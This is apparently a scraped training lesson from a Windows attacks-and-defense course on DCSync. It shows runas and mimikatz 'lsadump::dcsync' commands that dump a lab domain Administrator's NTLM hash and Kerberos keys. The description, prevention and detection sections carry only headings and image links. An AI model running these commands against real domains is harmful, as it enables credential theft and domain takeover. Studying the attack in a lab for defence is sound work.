<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/176/section/1784
// Platform Version: V1
// Module ID: 176
// Module Name: Windows Attacks & Defense
// Module Difficulty: Medium
// Section ID: 1784
// Section Title: DCSync
// Page Title: Windows Attacks & Defense
// Page Number: 09
-->

# DCSync

**Module Name:** Windows Attacks & Defense **Page Number:** 09

#### WINDOWS ATTACKS & DEFENSE

# DCSync

## Description

## Attack

![https://academy.hackthebox.com/storage/modules/176/A7/DCPermission.png](https://academy.hackthebox.com/storage/modules/176/A7/DCPermission.png)

``` cmd-session
C:\Users\bob\Downloads>runas /user:eagle\rocky cmd.exe

Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky" ...
```

![https://academy.hackthebox.com/storage/modules/176/A7/Rockyprompt.png](https://academy.hackthebox.com/storage/modules/176/A7/Rockyprompt.png)

``` cmd-session
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6fd69313922373216cdbbfa823bd268d

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
      des_cbc_md5       (4096) : d9b53b1f6d7c45a8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Credentials
      des_cbc_md5       : d9b53b1f6d7c45a8
```

![https://academy.hackthebox.com/storage/modules/176/A7/AdminHash.png](https://academy.hackthebox.com/storage/modules/176/A7/AdminHash.png)

## Prevention

## Detection

![https://academy.hackthebox.com/storage/modules/176/A7/DetectDCSync.png](https://academy.hackthebox.com/storage/modules/176/A7/DetectDCSync.png)

# 

# 

#### Questions

####